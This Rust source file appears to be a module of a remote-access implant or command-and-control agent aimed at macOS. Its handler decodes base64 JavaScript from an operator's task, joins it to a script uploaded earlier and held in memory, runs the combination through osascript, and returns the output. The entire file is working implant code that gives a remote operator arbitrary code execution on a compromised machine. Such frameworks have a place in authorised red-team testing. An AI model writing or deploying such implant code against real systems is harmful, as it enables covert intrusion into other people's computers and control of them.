use crate::structs::Task;
use base64::Engine;
use serde::Deserialize;
use tokio::process::Command;

#[derive(Deserialize)]
struct JsImportCallArgs {
    code: String,
    file_id: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: JsImportCallArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Decode the additional code snippet
    let code_bytes = match base64::engine::general_purpose::STANDARD.decode(&args.code) {
        Ok(d) => d,
        Err(e) => {
            response.set_error(&format!("Failed to decode base64: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let additional_code = match String::from_utf8(code_bytes) {
        Ok(s) => s,
        Err(e) => {
            response.set_error(&format!("Invalid UTF-8: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Retrieve the previously imported script from memory
    let saved_file = (task.job.get_saved_file)(&args.file_id);
    let base_code = match saved_file {
        Some(data) => match String::from_utf8(data) {
            Ok(s) => s,
            Err(_) => {
                response.set_error("Saved script is not valid UTF-8");
                let _ = task.job.send_responses.send(response).await;
                let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
                return;
            }
        },
        None => {
            response.user_output =
                "Failed to find that file in memory, did you upload with jsimport first?"
                    .to_string();
            response.status = "error".to_string();
            response.completed = true;
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Combine base script with additional code
    let combined = format!("{}\n{}", base_code, additional_code);

    // Execute via osascript
    match Command::new("osascript")
        .args(["-l", "JavaScript", "-e", &combined])
        .output()
        .await
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() && stdout.is_empty() {
                response.user_output = stderr.to_string();
            } else {
                response.user_output = stdout.to_string();
            }
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to execute: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
